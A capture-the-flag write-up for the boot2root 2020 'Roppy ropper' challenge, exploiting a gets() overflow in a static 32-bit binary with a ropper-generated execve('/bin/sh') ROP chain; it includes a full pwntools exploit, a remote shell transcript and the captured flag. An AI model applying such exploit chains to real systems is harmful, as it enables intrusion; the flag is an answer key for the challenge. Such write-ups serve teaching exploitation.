# boot2root 2020

## Roppy ropper

> 467
>
> I love ropes do you?
>
> `nc 35.238.225.156 1004`
>
> Author: TheBadGuy
> 
> [lsass](lsass)

Tags: _pwn_ _x86_ _remote-shell_ _bof_ _rop_


## Summary

Static ROP binary, parts included, no assembly required.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

No PIE or Canary (where is matters, see below); easy easy ROP.


### Decompile with Ghidra

```c
void list_me_like_crazy(void)
{
  char *pcVar1;
  char local_11 [9];
  
  puts("(list_me_like_crazy)");
  puts("Is this lsass I dont understand :)");
  puts("Give me your arguments:");
  gets(local_11);
  pcVar1 = strchr(local_11,0x2f);
  if (pcVar1 == (char *)0x0) {
    run_command(local_11);
  }
  else {
    puts("Hey sorry that is not allowed");
  }
  return;
}
```

When loading up in Ghidra the first thing you'll notice is how long it takes Ghidra to analyze the binary because it is statically linked:

```
lsass: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked,
BuildID[sha1]=29ace8e7875f5edabe4ce83e83ec1aebd4cfa48c, for GNU/Linux 3.2.0, not stripped
```

Like [Welcome to Pwn](https://github.com/datajerk/ctf-write-ups/tree/master/boot2root2020/welcome_to_pwn), `gets` is the vulnerability, but since we have a binary full of gadgets using something like `ropper` (hint in the title) is all we need:

```
ropper --file lsass --chain "execve cmd=/bin/sh" --badbytes 0a
```

The output of that prefixed with `0x11` bytes of garbage is all we need to get a shell (`local_11` is `0x11` bytes from the return address on the stack).


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./lsass')

if args.REMOTE:
        p = remote('35.238.225.156', 1004)
else:
        p = process(binary.path)

# ropper --file lsass --chain "execve cmd=/bin/sh" --badbytes 0a
IMAGE_BASE_0 = 0x08048000 # da2732480d49a078e666802ee2edcd948700eacaaa48129430ea1ff6d5e8e5c6
rebase_0 = lambda x : p32(x + IMAGE_BASE_0)

rop  = b''
rop += rebase_0(0x0000319b) # 0x0804b19b: pop edi; ret;
rop += b'//bi'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a060)
rop += rebase_0(0x0004627d) # 0x0808e27d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret;
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000319b) # 0x0804b19b: pop edi; ret;
rop += b'n/sh'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a064)
rop += rebase_0(0x0004627d) # 0x0808e27d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret;
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000319b) # 0x0804b19b: pop edi; ret;
rop += p32(0x00000000)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a068)
rop += rebase_0(0x0004627d) # 0x0808e27d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret;
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret;
rop += rebase_0(0x0009a060)
rop += rebase_0(0x0001c081) # 0x08064081: pop ecx; add al, 0xf6; ret;
rop += rebase_0(0x0009a068)
rop += rebase_0(0x0004fa95) # 0x08097a95: pop edx; xor eax, eax; pop edi; ret;
rop += rebase_0(0x0009a068)
rop += p32(0xdeadbeef)
rop += rebase_0(0x00001825) # 0x08049825: pop ebp; ret;
rop += p32(0x0000000b)
rop += rebase_0(0x0001aa7e) # 0x08062a7e: xchg eax, ebp; ret;
rop += rebase_0(0x000319a0) # 0x080799a0: int 0x80; ret;

payload  = 0x11 * b'A'
payload += rop

p.sendlineafter('arguments:\n',payload)
p.interactive()
```

As stated in the Analysis section, `0x11` bytes, then ROPchain from `ropper`.

> The above is not 100% `ropper` output, I changed `p` to `p32`, added `b` to strings because I use `python3`, etc... nothing difficult to understand.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/roppy_ropper/lsass'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 35.238.225.156 on port 1004: Done
[*] Switching to interactive mode
Hey sorry that is not allowed
$ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
$ ls -l
total 688
-r--r--r-- 1 pwnflag pwnflag     35 Dec  6 09:29 flag.txt
-rwsr-xr-x 1 pwnflag pwnflag 698068 Dec  6 09:29 lsass
$ cat flag.txt
b00t2root{R0p_cHa1nS_ar3_tH3_b3st}
```
